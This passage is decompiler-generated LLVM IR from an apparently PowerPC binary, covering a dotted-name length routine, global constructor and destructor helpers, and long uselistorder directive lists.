  store i32 %v1_1000fb8c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fb9c

dec_label_pc_1000fb9c:                            ; preds = %dec_label_pc_1000fb34, %dec_label_pc_1000fb88, %dec_label_pc_1000fb8c, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_1000fb8c, %dec_label_pc_1000fb8c ], [ %v0_1000fb90.pre.pre, %dec_label_pc_1000fb88 ], [ -1, %dec_label_pc_1000fb34 ]
  %v1_1000fbac = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000fac8)
  %v9_1000fbac = extractvalue %0 %v1_1000fbac, 7
  store i4 %v9_1000fbac, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000fb90.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000fb7c, { 0, 2, 1 }
  uselistorder i32 %v5_1000fb78, { 1, 0 }
  uselistorder i32 %v5_1000fb7821, { 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000fac8, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 3, 4, 5, 2, 0, 6, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 12, 11, 10, 9, 8, 4, 3, 7, 6, 2, 21, 18, 17, 0, 19, 5, 1, 16, 15, 14, 20, 13 }
  uselistorder i32* @r5, { 41, 42, 43, 3, 44, 45, 46, 13, 57, 58, 50, 51, 11, 4, 52, 1, 53, 14, 15, 16, 17, 18, 19, 59, 20, 21, 22, 23, 24, 25, 72, 9, 10, 8, 6, 54, 55, 64, 65, 66, 12, 26, 27, 28, 73, 74, 75, 76, 67, 68, 2, 69, 70, 71, 29, 31, 30, 32, 0, 33, 34, 35, 60, 61, 47, 48, 36, 37, 38, 49, 7, 62, 63, 5, 39, 40, 56 }
  uselistorder i32* @r29, { 70, 71, 72, 73, 74, 138, 139, 1, 75, 14, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 86, 20, 21, 22, 23, 24, 2, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 40, 100, 102, 103, 119, 120, 140, 141, 42, 43, 44, 41, 125, 16, 45, 46, 3, 47, 48, 49, 50, 51, 52, 142, 143, 144, 145, 146, 147, 148, 4, 35, 124, 127, 128, 129, 130, 25, 26, 131, 5, 132, 133, 134, 135, 136, 137, 121, 122, 123, 6, 126, 7, 149, 150, 151, 53, 54, 8, 55, 56, 57, 58, 110, 111, 15, 112, 104, 105, 106, 109, 107, 17, 9, 0, 108, 59, 60, 61, 62, 63, 64, 65, 68, 10, 13, 11, 69, 19, 66, 67, 152, 153, 154, 155, 113, 114, 115, 116, 117, 12, 118, 101, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 18 }
  uselistorder i32* @r28, { 2, 76, 77, 78, 79, 80, 81, 86, 87, 82, 83, 84, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 17, 3, 16, 18, 19, 20, 21, 22, 23, 98, 102, 99, 100, 101, 1, 103, 104, 41, 42, 128, 129, 136, 137, 43, 4, 44, 45, 46, 47, 48, 5, 138, 139, 140, 141, 148, 6, 35, 36, 37, 12, 38, 24, 25, 26, 27, 28, 29, 30, 31, 32, 132, 133, 134, 135, 130, 131, 142, 143, 144, 145, 146, 49, 50, 113, 7, 114, 115, 107, 108, 109, 110, 111, 112, 51, 52, 53, 8, 54, 55, 9, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 13, 14, 15, 147, 116, 117, 118, 119, 10, 120, 11, 121, 122, 123, 124, 125, 126, 127, 74, 75, 105, 106, 33, 34, 39, 40 }
  uselistorder i32 23, { 10, 12, 13, 14, 6, 7, 8, 0, 1, 2, 5, 3, 4, 9, 11 }
  uselistorder i32 18, { 1, 0, 3, 4, 2 }
  uselistorder i32 8, { 83, 84, 85, 86, 87, 88, 18, 19, 89, 90, 91, 92, 93, 94, 24, 25, 20, 13, 14, 15, 26, 27, 28, 29, 30, 95, 96, 97, 98, 17, 46, 117, 0, 100, 47, 48, 49, 50, 51, 52, 53, 54, 10, 55, 56, 57, 129, 130, 137, 140, 8, 33, 34, 11, 31, 12, 80, 115, 32, 121, 120, 118, 119, 35, 36, 37, 122, 123, 124, 125, 126, 127, 1, 108, 109, 110, 21, 134, 135, 136, 2, 141, 3, 138, 139, 101, 102, 38, 103, 39, 58, 59, 60, 61, 62, 22, 63, 64, 65, 66, 4, 5, 67, 68, 9, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 7, 6, 131, 132, 133, 104, 105, 106, 107, 99, 40, 41, 42, 43, 44, 45, 79, 23, 81, 82, 111, 112, 113, 114, 116, 16, 128 }
  uselistorder i32* @r30, { 82, 83, 84, 8, 85, 87, 89, 90, 91, 92, 93, 86, 88, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 108, 105, 106, 5, 107, 4, 40, 41, 42, 9, 43, 44, 45, 110, 111, 112, 121, 122, 123, 124, 17, 125, 126, 127, 128, 129, 130, 131, 132, 46, 47, 48, 49, 50, 143, 144, 10, 51, 52, 53, 54, 55, 11, 153, 154, 155, 156, 12, 146, 157, 168, 158, 159, 27, 0, 79, 13, 80, 81, 147, 148, 149, 28, 29, 30, 31, 32, 150, 151, 152, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 145, 160, 161, 162, 163, 164, 165, 166, 14, 167, 56, 57, 119, 117, 118, 120, 116, 114, 113, 6, 115, 58, 59, 60, 61, 62, 2, 64, 18, 65, 15, 66, 67, 63, 68, 69, 70, 71, 72, 73, 74, 16, 75, 76, 3, 77, 78, 109, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1 false, { 1, 2, 4, 5, 6, 8, 9, 0, 11, 12, 13, 3, 10, 7, 14 }
  uselistorder i32* @r31, { 129, 2, 7, 130, 6, 131, 132, 133, 8, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 45, 50, 9, 39, 10, 11, 51, 52, 53, 148, 149, 150, 151, 1, 152, 153, 154, 155, 156, 157, 158, 159, 12, 160, 69, 70, 71, 72, 73, 161, 13, 162, 163, 164, 165, 14, 166, 167, 168, 169, 170, 171, 74, 75, 76, 77, 78, 79, 80, 81, 82, 15, 83, 16, 263, 264, 265, 17, 178, 177, 3, 179, 180, 203, 230, 231, 232, 233, 234, 65, 66, 67, 68, 181, 18, 182, 183, 19, 192, 193, 20, 194, 195, 84, 85, 86, 246, 247, 248, 87, 88, 21, 89, 90, 91, 92, 22, 93, 23, 94, 95, 96, 44, 97, 0, 266, 267, 268, 24, 46, 269, 40, 250, 25, 251, 275, 276, 42, 59, 270, 273, 274, 63, 64, 54, 55, 56, 57, 58, 127, 128, 4, 252, 253, 254, 255, 256, 257, 60, 61, 62, 258, 259, 260, 261, 262, 235, 236, 237, 27, 238, 239, 240, 26, 241, 242, 243, 244, 245, 249, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 98, 99, 196, 197, 198, 28, 199, 200, 201, 186, 187, 188, 189, 190, 29, 43, 191, 5, 184, 185, 30, 202, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 33, 32, 117, 31, 121, 122, 34, 123, 124, 125, 126, 48, 49, 119, 118, 120, 271, 35, 272, 47, 36, 41, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 216, 215, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 172, 173, 174, 175, 37, 38, 176 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10, 11, 12, 17, 13, 14, 18 }
  uselistorder i32* @r25, { 10, 11, 12, 14, 15, 13, 16, 1, 2, 17, 18, 19, 20, 21, 22, 23, 24, 25, 30, 33, 3, 4, 26, 27, 28, 29, 0, 6, 7, 8, 9, 31, 32, 5 }
  uselistorder i32* @r26, { 1, 30, 31, 32, 33, 34, 35, 36, 39, 37, 38, 40, 41, 42, 43, 44, 3, 4, 45, 46, 47, 48, 50, 2, 51, 52, 54, 55, 56, 57, 58, 59, 60, 10, 11, 77, 5, 6, 7, 73, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 0, 75, 76, 53, 28, 29, 49, 8, 9 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 33, 27, 26, 12, 32, 20, 34, 9, 8, 7, 6, 5, 15, 41, 40, 25, 39, 31, 30, 10, 29, 11, 38, 23, 21, 37, 19, 3, 14, 18, 13, 36, 24, 17, 16, 35, 4, 2, 1, 0, 22 }
  uselistorder label %dec_label_pc_1000fb9c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000fb8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb74, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb70, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb60, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb04, { 1, 0 }
  uselistorder label %dec_label_pc_1000fafc, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000fbb8 = load i32, i32* @r3, align 4
  store i32 %v0_1000fbb8, i32* %r11.global-to-local, align 4
  %v3_1000fbb8 = icmp eq i32 %v0_1000fbb8, 0
  %v0_1000fbc0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000fbb8, i32 %v0_1000fbc0)
  %v0_1000fbd0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000fbdc

dec_label_pc_1000fbc8:                            ; preds = %dec_label_pc_1000fbd8
  %v1_1000fbc8 = add i32 %v1_1000fbdc, 2
  br label %dec_label_pc_1000fbf8

dec_label_pc_1000fbd8:                            ; preds = %dec_label_pc_1000fbdc
  %v2_1000fbf0 = add i32 %v1_1000fbe0, %v5_1000fbdc
  %v3_1000fbec = icmp eq i32 %v1_1000fbe8, 192
  br i1 %v3_1000fbec, label %dec_label_pc_1000fbc8, label %dec_label_pc_1000fbdc

dec_label_pc_1000fbdc:                            ; preds = %dec_label_pc_1000fbd8, %entry
  %v1_1000fbdc = phi i32 [ %v2_1000fbf0, %dec_label_pc_1000fbd8 ], [ %v0_1000fbd0, %entry ]
  %v0_1000fbdc = load i32, i32* %r11.global-to-local, align 4
  %v2_1000fbdc = add i32 %v0_1000fbdc, %v1_1000fbdc
  %v3_1000fbdc = inttoptr i32 %v2_1000fbdc to i8*
  %v4_1000fbdc = load i8, i8* %v3_1000fbdc, align 1
  %v5_1000fbdc = zext i8 %v4_1000fbdc to i32
  %v1_1000fbe0 = add i32 %v1_1000fbdc, 1
  %v3_1000fbe4 = icmp eq i8 %v4_1000fbdc, 0
  %v1_1000fbe8 = call i32 @__asm_rlwinm(i32 %v5_1000fbdc, i32 0, i32 24, i32 25)
  br i1 %v3_1000fbe4, label %dec_label_pc_1000fbf8, label %dec_label_pc_1000fbd8

dec_label_pc_1000fbf8:                            ; preds = %dec_label_pc_1000fbdc, %dec_label_pc_1000fbc8
  %v1_1000fbf8 = phi i32 [ %v1_1000fbc8, %dec_label_pc_1000fbc8 ], [ %v1_1000fbe0, %dec_label_pc_1000fbdc ]
  %v0_1000fbf8 = load i32, i32* @r4, align 4
  %v2_1000fbf8 = sub i32 %v1_1000fbf8, %v0_1000fbf8
  ret i32 %v2_1000fbf8

; uselistorder directives
  uselistorder i32 %v1_1000fbe0, { 1, 0 }
  uselistorder i32 %v5_1000fbdc, { 1, 0 }
  uselistorder i32 %v1_1000fbdc, { 2, 1, 0 }
  uselistorder i32 %v0_1000fbb8, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38, 6, 7, 8, 1, 52, 53, 2, 46, 3, 47, 0, 51, 4, 54, 55, 56, 9, 36, 37, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 39, 40, 41, 42, 35, 50, 43, 44, 45, 48, 49, 57 }
  uselistorder i32 25, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 24, { 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 12, 36, 37, 45, 38, 39, 42, 13, 5, 47, 6, 14, 43, 40, 41, 15, 16, 17, 18, 19, 20, 21, 22, 23, 49, 50, 44, 7, 8, 9, 10, 11, 1, 2, 3, 4, 24, 25, 46, 0, 48 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 5, 50, 49, 25, 6, 51, 52, 7, 53, 54, 21, 27, 57, 55, 56, 26, 58, 59, 8, 61, 60, 28, 62, 63, 0, 64, 65, 66, 9, 67, 10, 68, 11, 1, 12, 69, 70, 71, 73, 74, 75, 76, 72, 77, 13, 78, 79, 80, 81, 83, 84, 85, 86, 82, 87, 3, 14, 15, 16, 17, 18, 19, 88, 90, 89, 20, 91, 92, 93, 94, 95, 96, 98, 29, 99, 100, 97, 101, 102, 103, 104, 106, 105, 107, 108, 109, 110, 111, 113, 112, 114, 30, 116, 115, 36, 117, 31, 118, 120, 121, 119, 32, 122, 123, 34, 124, 33, 125, 126, 127, 128, 129, 130, 131 }
  uselistorder i32 192, { 1, 2, 0 }
  uselistorder i32 2, { 0, 4, 110, 49, 111, 112, 30, 1, 2, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 5, 125, 6, 87, 88, 89, 31, 29, 126, 127, 128, 129, 130, 50, 51, 52, 94, 95, 146, 42, 7, 8, 3, 53, 136, 9, 10, 32, 133, 134, 40, 96, 97, 11, 98, 99, 100, 54, 55, 90, 56, 91, 57, 92, 147, 33, 12, 13, 14, 47, 48, 58, 59, 137, 46, 149, 15, 16, 17, 18, 34, 35, 36, 37, 38, 60, 144, 145, 39, 131, 132, 101, 102, 103, 19, 20, 21, 22, 23, 104, 105, 24, 107, 108, 109, 28, 106, 135, 61, 25, 26, 148, 150, 62, 93, 64, 65, 63, 66, 43, 67, 68, 44, 70, 71, 69, 72, 74, 73, 75, 76, 77, 78, 79, 138, 139, 140, 141, 80, 41, 142, 81, 82, 83, 84, 85, 143, 45, 27, 86 }
  uselistorder i32* @r4, { 80, 81, 1, 82, 83, 84, 85, 2, 86, 87, 88, 89, 9, 10, 90, 91, 92, 93, 94, 95, 96, 97, 98, 121, 118, 119, 99, 100, 101, 102, 103, 6, 104, 105, 106, 115, 116, 45, 11, 54, 55, 56, 57, 58, 59, 60, 61, 131, 7, 8, 15, 16, 123, 28, 29, 14, 78, 79, 17, 18, 120, 19, 12, 107, 108, 114, 117, 124, 125, 126, 3, 62, 63, 64, 13, 65, 66, 109, 110, 111, 112, 113, 4, 130, 67, 68, 69, 70, 0, 71, 72, 73, 122, 74, 75, 76, 5, 20, 21, 127, 128, 129, 22, 23, 24, 25, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 77 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 11, 13, 14, 15, 16, 17, 18, 1, 29, 31, 26, 2, 3, 4, 5, 6, 7, 30, 25, 21, 22, 23, 24, 8, 19, 20, 12, 33, 32, 9, 27, 0, 28 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10023000.351 to i32), i32* %r31.global-to-local, align 4
  %v3_1000fc1c = load i32, i32* @global_var_10023000.351, align 4
  %v3_1000fc20 = icmp eq i32 %v3_1000fc1c, -1
  br i1 %v3_1000fc20, label %dec_label_pc_1000fc3c, label %dec_label_pc_1000fc28

dec_label_pc_1000fc28:                            ; preds = %entry, %dec_label_pc_1000fc28
  %v0_1000fc28 = phi i32 [ %v3_1000fc30, %dec_label_pc_1000fc28 ], [ %v3_1000fc1c, %entry ]
  call void @__pseudo_call(i32 %v0_1000fc28)
  %v0_1000fc30 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fc30 = add i32 %v0_1000fc30, -4
  %v2_1000fc30 = inttoptr i32 %v1_1000fc30 to i32*
  %v3_1000fc30 = load i32, i32* %v2_1000fc30, align 4
  store i32 %v1_1000fc30, i32* %r31.global-to-local, align 4
  %v3_1000fc34 = icmp eq i32 %v3_1000fc30, -1
  br i1 %v3_1000fc34, label %dec_label_pc_1000fc3c, label %dec_label_pc_1000fc28

dec_label_pc_1000fc3c:                            ; preds = %dec_label_pc_1000fc28, %entry
  %v0_1000fc4c = load i32, i32* @r3, align 4
  ret i32 %v0_1000fc4c

; uselistorder directives
  uselistorder i32 %v3_1000fc30, { 1, 0 }
  uselistorder i32 -4, { 28, 12, 13, 14, 21, 22, 23, 24, 25, 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 26, 32, 33, 29, 30, 31, 17, 18, 19, 20, 0, 11, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, { 365, 366, 16, 47, 66, 302, 303, 259, 134, 304, 67, 305, 58, 68, 306, 69, 307, 230, 231, 117, 118, 71, 70, 232, 48, 49, 233, 234, 235, 192, 77, 75, 73, 236, 237, 238, 76, 74, 72, 239, 240, 193, 241, 194, 308, 25, 26, 195, 309, 196, 59, 310, 78, 260, 135, 3, 4, 261, 262, 60, 263, 264, 79, 80, 197, 367, 29, 30, 31, 368, 198, 372, 27, 28, 312, 32, 322, 323, 324, 138, 325, 326, 327, 328, 329, 330, 331, 136, 332, 137, 333, 334, 335, 336, 199, 265, 200, 61, 5, 201, 266, 267, 202, 203, 204, 268, 205, 337, 338, 33, 34, 35, 206, 339, 340, 207, 313, 317, 318, 50, 269, 270, 271, 126, 62, 272, 273, 274, 275, 139, 276, 6, 81, 277, 278, 279, 280, 281, 208, 282, 140, 350, 351, 141, 7, 8, 142, 63, 283, 209, 210, 284, 285, 286, 287, 82, 83, 355, 143, 84, 85, 86, 87, 88, 89, 90, 0, 375, 373, 91, 245, 246, 144, 211, 247, 38, 39, 212, 248, 36, 37, 213, 257, 9, 145, 242, 10, 92, 64, 300, 40, 41, 214, 146, 119, 301, 93, 243, 356, 357, 46, 244, 371, 249, 94, 250, 215, 251, 42, 43, 252, 253, 354, 65, 216, 341, 120, 342, 343, 147, 347, 95, 352, 376, 377, 288, 348, 96, 217, 218, 344, 345, 219, 346, 124, 220, 221, 222, 223, 224, 44, 225, 148, 97, 319, 121, 314, 316, 315, 17, 18, 19, 20, 21, 22, 23, 122, 123, 289, 15, 290, 11, 291, 292, 226, 149, 24, 227, 293, 294, 1, 296, 297, 2, 150, 151, 228, 45, 152, 127, 298, 153, 295, 320, 12, 13, 299, 154, 321, 155, 311, 156, 98, 99, 100, 369, 370, 101, 102, 103, 104, 105, 106, 107, 108, 109, 254, 110, 111, 112, 113, 114, 115, 374, 116, 378, 157, 190, 255, 256, 158, 159, 160, 51, 52, 53, 54, 55, 56, 57, 161, 162, 163, 164, 165, 166, 167, 128, 168, 169, 170, 258, 171, 172, 173, 174, 175, 14, 176, 177, 349, 191, 229, 178, 179, 180, 181, 353, 182, 125, 183, 129, 130, 131, 132, 133, 184, 185, 358, 359, 360, 186, 361, 362, 363, 364, 187, 188, 189 }
  uselistorder i32 1, { 173, 824, 333, 825, 826, 827, 828, 829, 830, 170, 168, 169, 831, 461, 832, 833, 127, 128, 126, 129, 527, 171, 172, 834, 397, 835, 401, 838, 839, 840, 841, 842, 462, 843, 844, 845, 93, 92, 97, 96, 95, 94, 98, 91, 99, 846, 847, 848, 528, 48, 51, 49, 47, 50, 52, 849, 162, 163, 850, 80, 851, 104, 102, 101, 103, 387, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 530, 529, 195, 194, 193, 196, 197, 198, 716, 717, 718, 719, 531, 525, 323, 315, 325, 314, 320, 321, 322, 319, 317, 318, 316, 324, 326, 412, 852, 853, 390, 854, 855, 856, 857, 859, 860, 532, 205, 203, 204, 202, 206, 450, 864, 861, 862, 863, 533, 184, 182, 181, 178, 180, 183, 185, 177, 176, 179, 175, 174, 865, 747, 748, 749, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 239, 237, 238, 235, 241, 236, 242, 240, 402, 750, 298, 243, 234, 261, 403, 760, 140, 141, 139, 142, 108, 761, 535, 534, 106, 105, 107, 219, 334, 1011, 463, 464, 537, 536, 251, 247, 250, 249, 246, 248, 540, 539, 538, 130, 131, 541, 884, 388, 885, 888, 889, 890, 891, 892, 543, 542, 335, 336, 338, 337, 906, 907, 908, 384, 909, 910, 413, 911, 912, 433, 434, 465, 414, 427, 913, 467, 437, 914, 915, 468, 916, 917, 918, 466, 549, 548, 547, 546, 517, 545, 544, 86, 85, 82, 84, 87, 81, 88, 83, 89, 0, 976, 977, 978, 979, 415, 39, 751, 752, 37, 38, 753, 217, 216, 215, 214, 218, 762, 262, 264, 263, 265, 763, 764, 469, 765, 311, 312, 313, 331, 332, 327, 330, 329, 328, 470, 893, 896, 518, 45, 44, 46, 473, 766, 767, 768, 471, 769, 472, 770, 771, 772, 773, 774, 560, 559, 558, 557, 556, 555, 554, 553, 552, 551, 519, 550, 155, 148, 152, 153, 147, 154, 158, 156, 151, 157, 146, 150, 159, 149, 160, 161, 145, 144, 143, 964, 451, 20, 19, 17, 18, 21, 124, 123, 125, 1013, 1014, 110, 111, 109, 775, 776, 561, 342, 339, 340, 343, 341, 344, 416, 777, 564, 563, 562, 292, 291, 208, 225, 345, 346, 207, 192, 474, 565, 76, 475, 439, 438, 566, 721, 570, 569, 568, 567, 256, 255, 252, 253, 258, 254, 257, 1015, 573, 572, 571, 229, 232, 231, 230, 1016, 574, 740, 741, 742, 452, 743, 77, 78, 79, 476, 744, 720, 74, 70, 68, 72, 69, 73, 71, 75, 819, 417, 820, 575, 348, 347, 349, 350, 351, 352, 54, 55, 53, 60, 56, 59, 58, 61, 63, 57, 62, 576, 577, 578, 289, 580, 579, 302, 300, 301, 233, 24, 23, 22, 260, 259, 398, 581, 353, 1012, 354, 477, 478, 584, 583, 582, 188, 187, 189, 190, 186, 191, 277, 440, 585, 586, 587, 588, 589, 590, 591, 592, 453, 454, 919, 418, 479, 920, 921, 441, 931, 595, 594, 593, 31, 34, 30, 29, 32, 28, 26, 27, 33, 25, 35, 36, 596, 597, 598, 965, 966, 245, 244, 1017, 600, 599, 355, 602, 601, 200, 199, 201, 603, 956, 957, 958, 137, 136, 135, 132, 134, 133, 836, 837, 778, 779, 604, 356, 358, 357, 359, 934, 935, 936, 937, 938, 939, 940, 941, 942, 944, 943, 945, 946, 116, 115, 122, 120, 119, 121, 118, 117, 404, 780, 922, 923, 924, 925, 926, 927, 928, 929, 930, 293, 296, 294, 295, 297, 1002, 1003, 1004, 737, 391, 114, 113, 112, 887, 886, 405, 858, 275, 1025, 1026, 306, 303, 307, 304, 305, 1021, 1022, 1023, 1024, 362, 361, 360, 90, 480, 442, 897, 898, 899, 428, 406, 67, 66, 65, 895, 605, 64, 419, 481, 894, 607, 606, 608, 310, 309, 308, 609, 287, 288, 286, 285, 610, 284, 283, 781, 782, 483, 783, 784, 785, 786, 787, 788, 790, 791, 792, 484, 793, 794, 420, 795, 482, 796, 485, 797, 798, 799, 789, 614, 613, 612, 611, 10, 9, 6, 4, 5, 7, 12, 11, 8, 800, 801, 802, 803, 804, 365, 363, 364, 366, 367, 486, 209, 210, 805, 806, 15, 14, 16, 13, 808, 421, 809, 399, 422, 811, 812, 813, 814, 423, 816, 425, 815, 810, 520, 621, 620, 619, 618, 617, 616, 615, 371, 373, 368, 372, 370, 375, 369, 374, 376, 407, 408, 280, 281, 282, 807, 443, 521, 487, 213, 212, 211, 1019, 444, 1020, 900, 901, 902, 903, 904, 905, 409, 623, 622, 166, 164, 167, 165, 625, 624, 378, 379, 377, 627, 626, 882, 883, 629, 628, 100, 279, 290, 272, 380, 223, 299, 221, 222, 630, 276, 224, 226, 381, 631, 227, 382, 228, 266, 269, 270, 632, 267, 633, 268, 1018, 634, 271, 722, 424, 429, 400, 723, 724, 725, 385, 490, 726, 727, 728, 426, 729, 730, 731, 732, 733, 488, 489, 435, 491, 734, 641, 640, 639, 638, 637, 636, 635, 735, 736, 646, 645, 644, 522, 643, 642, 492, 738, 739, 647, 745, 746, 493, 494, 754, 495, 652, 651, 650, 649, 648, 755, 756, 496, 757, 758, 759, 657, 656, 655, 654, 653, 817, 658, 818, 662, 661, 660, 659, 821, 497, 498, 822, 823, 666, 665, 664, 663, 220, 445, 499, 500, 669, 668, 667, 455, 932, 671, 670, 43, 42, 41, 430, 389, 933, 431, 672, 446, 947, 501, 502, 949, 392, 948, 503, 675, 674, 673, 386, 950, 951, 504, 505, 506, 959, 523, 952, 953, 447, 448, 507, 954, 508, 955, 393, 682, 681, 680, 679, 678, 677, 676, 396, 960, 961, 456, 962, 509, 963, 394, 685, 684, 683, 686, 967, 968, 969, 510, 970, 971, 395, 972, 511, 973, 689, 688, 687, 524, 974, 278, 975, 40, 458, 980, 981, 457, 982, 983, 459, 460, 984, 985, 986, 1, 2, 988, 987, 512, 692, 691, 690, 513, 989, 990, 693, 695, 694, 697, 696, 514, 698, 991, 992, 449, 999, 1000, 432, 1001, 699, 436, 3, 701, 700, 411, 993, 994, 410, 997, 998, 515, 516, 995, 996, 702, 138, 1005, 1006, 273, 1007, 1008, 1009, 383, 1010, 704, 703, 274, 526 }
  uselistorder label %dec_label_pc_1000fc28, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1000fc68 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fc68

; uselistorder directives
  uselistorder i32* @r3, { 19, 20, 166, 167, 170, 168, 169, 0, 171, 10, 172, 53, 54, 55, 173, 176, 177, 45, 178, 21, 11, 93, 94, 12, 22, 111, 112, 113, 259, 271, 268, 269, 179, 187, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 13, 225, 226, 227, 228, 229, 230, 231, 232, 233, 95, 96, 14, 97, 98, 99, 23, 114, 115, 116, 117, 118, 15, 234, 42, 24, 119, 120, 121, 122, 123, 124, 2, 1, 125, 126, 127, 25, 272, 50, 284, 26, 43, 27, 3, 41, 61, 62, 49, 278, 279, 280, 156, 157, 158, 159, 160, 161, 162, 163, 56, 57, 58, 59, 60, 248, 249, 63, 44, 64, 18, 28, 260, 261, 270, 65, 235, 236, 237, 238, 239, 240, 241, 242, 29, 30, 31, 32, 281, 282, 4, 128, 129, 130, 131, 266, 174, 175, 16, 33, 283, 34, 193, 194, 195, 196, 197, 198, 199, 35, 188, 189, 190, 191, 192, 66, 67, 200, 201, 68, 69, 132, 36, 133, 134, 135, 5, 9, 6, 136, 7, 137, 8, 138, 139, 140, 141, 142, 143, 37, 144, 145, 146, 147, 148, 149, 52, 273, 274, 275, 276, 277, 202, 203, 204, 205, 206, 207, 208, 209, 150, 151, 152, 180, 181, 182, 183, 184, 185, 186, 70, 71, 38, 72, 73, 74, 75, 76, 78, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 153, 154, 155, 51, 164, 165, 243, 244, 245, 246, 247, 250, 17, 251, 252, 253, 254, 255, 256, 257, 46, 258, 47, 262, 263, 264, 265, 267, 39, 40, 48 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268500092, i32* @lr, align 4
  %v0_1000fc78 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1000fc78

; uselistorder directives
  uselistorder i32 0, { 1070, 1071, 36, 1074, 126, 1072, 1073, 60, 1075, 1076, 1077, 1080, 1078, 0, 1079, 1081, 25, 877, 878, 1097, 1084, 1087, 1088, 1089, 326, 1090, 1091, 1093, 1092, 1094, 1095, 1096, 1098, 1099, 1100, 1082, 1083, 1085, 1086, 127, 1101, 1103, 1104, 1102, 1105, 1106, 1107, 1108, 243, 709, 1109, 244, 710, 711, 128, 129, 720, 721, 97, 722, 723, 724, 725, 726, 727, 728, 130, 189, 730, 729, 131, 731, 732, 133, 132, 733, 327, 734, 735, 736, 135, 134, 737, 738, 253, 328, 739, 136, 1110, 1111, 1112, 1113, 1119, 1114, 64, 1120, 1121, 1115, 1116, 1117, 61, 62, 63, 1122, 329, 37, 38, 39, 231, 1124, 137, 1123, 330, 1125, 1126, 1127, 1128, 138, 1129, 98, 40, 1130, 190, 1131, 1132, 1133, 854, 191, 879, 880, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 881, 26, 882, 140, 139, 883, 884, 885, 886, 141, 1141, 1142, 1143, 1144, 887, 888, 889, 890, 891, 892, 